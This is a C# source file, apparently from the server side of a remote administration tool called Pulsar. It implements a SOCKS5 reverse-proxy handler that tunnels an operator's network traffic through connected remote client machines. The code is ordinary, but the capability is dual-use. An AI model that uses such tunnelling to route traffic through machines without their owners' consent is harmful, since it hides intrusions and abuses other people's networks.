﻿using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.ReverseProxy;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Server.Networking;
using Pulsar.Server.ReverseProxy;
using System;
using System.Linq;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote reverse proxy.
    /// </summary>
    public class ReverseProxyHandler : MessageProcessorBase<ReverseProxyClient[]>
    {
        /// <summary>
        /// The clients which is associated with this reverse proxy handler.
        /// </summary>
        private readonly Client[] _clients;

        /// <summary>
        /// The reverse proxy server to accept & serve SOCKS5 connections.
        /// </summary>
        private readonly ReverseProxyServer _socksServer;

        /// <summary>
        /// Initializes a new instance of the <see cref="ReverseProxyHandler"/> class using the given clients.
        /// </summary>
        /// <param name="clients">The associated clients.</param>
        public ReverseProxyHandler(Client[] clients) : base(true)
        {
            _socksServer = new ReverseProxyServer();
            _clients = clients;
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is ReverseProxyConnectResponse ||
                                                             message is ReverseProxyData ||
                                                             message is ReverseProxyDisconnect;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _clients.Any(c => c.Equals(sender));

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case ReverseProxyConnectResponse con:
                    Execute(sender, con);
                    break;
                case ReverseProxyData data:
                    Execute(sender, data);
                    break;
                case ReverseProxyDisconnect disc:
                    Execute(sender, disc);
                    break;
            }
        }

        /// <summary>
        /// Starts the reverse proxy server using the given port.
        /// </summary>
        /// <param name="port">The port to listen on.</param>
        public void StartReverseProxyServer(ushort port)
        {
            _socksServer.OnConnectionEstablished += socksServer_onConnectionEstablished;
            _socksServer.OnUpdateConnection += socksServer_onUpdateConnection;
            _socksServer.StartServer(_clients, "0.0.0.0", port);
        }

        /// <summary>
        /// Stops the reverse proxy server.
        /// </summary>
        public void StopReverseProxyServer()
        {
            _socksServer.Stop();
            _socksServer.OnConnectionEstablished -= socksServer_onConnectionEstablished;
            _socksServer.OnUpdateConnection -= socksServer_onUpdateConnection;
        }

        private void Execute(ISender client, ReverseProxyConnectResponse message)
        {
            ReverseProxyClient socksClient = _socksServer.GetClientByConnectionId(message.ConnectionId);
            socksClient?.HandleCommandResponse(message);
        }

        private void Execute(ISender client, ReverseProxyData message)
        {
            ReverseProxyClient socksClient = _socksServer.GetClientByConnectionId(message.ConnectionId);
            socksClient?.SendToClient(message.Data);
        }

        private void Execute(ISender client, ReverseProxyDisconnect message)
        {
            ReverseProxyClient socksClient = _socksServer.GetClientByConnectionId(message.ConnectionId);
            socksClient?.Disconnect();
        }

        void socksServer_onUpdateConnection(ReverseProxyClient proxyClient)
        {
            OnReport(_socksServer.OpenConnections);
        }

        void socksServer_onConnectionEstablished(ReverseProxyClient proxyClient)
        {
            OnReport(_socksServer.OpenConnections);
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                StopReverseProxyServer();
            }
        }
    }
}
